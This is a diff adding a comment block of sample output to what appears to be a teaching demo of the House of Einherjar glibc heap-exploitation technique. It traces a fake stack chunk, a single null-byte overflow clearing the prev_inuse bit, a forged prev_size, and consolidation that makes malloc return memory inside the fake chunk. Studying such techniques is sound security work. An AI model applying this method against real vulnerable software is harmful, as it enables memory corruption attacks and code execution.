@@ -105,3 +105,48 @@ int main()
     d = malloc(0x200);
     fprintf(stderr, "Next malloc(0x200) is at %p\n", d);
 }
+
+/*
+Welcome to House of Einherjar!
+Tested in Ubuntu 16.04 64bit.
+This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.
+This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.
+
+We allocate 0x38 bytes for 'a'
+a: 0x5605a1745260
+Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: 0x38
+
+We create a fake chunk wherever we want, in this case we'll create the chunk on the stack
+However, you can also create the chunk in the heap or the bss, as long as you know its address
+We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks
+(although we could do the unsafe unlink technique here in some scenarios)
+Our fake chunk at 0x7ffec3e7e890 looks like:
+prev_size (not used): 0x100
+size: 0x100
+fwd: 0x7ffec3e7e890
+bck: 0x7ffec3e7e890
+fwd_nextsize: 0x7ffec3e7e890
+bck_nextsize: 0x7ffec3e7e890
+
+We allocate 0xf8 bytes for 'b'.
+b: 0x5605a17452a0
+
+b.size: 0x101
+b.size is: (0x100) | prev_inuse = 0x101
+We overflow 'a' with a single null byte into the metadata of 'b'
+b.size: 0x100
+This is easiest if b.size is a multiple of 0x100 so you don't change the size of b, only its prev_inuse bit
+If it had been modified, we would need a fake chunk inside b where it will try to consolidate the next chunk
+
+We write a fake prev_size to the last 8 bytes of a so that it will consolidate with our fake chunk
+Our fake prev_size will be 0x5605a1745290 - 0x7ffec3e7e890 = 0xffffd606dd8c6a00
+
+Modify fake chunk's size to reflect b's new prev_size
+Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set
+Our fake chunk size is now 0xffffd606dd8c6a00 (b.size + fake_prev_size)
+
+Now we can call malloc() and it will begin in our fake chunk
+Next malloc(0x200) is at 0x5605a17453a0
+
+
+*/
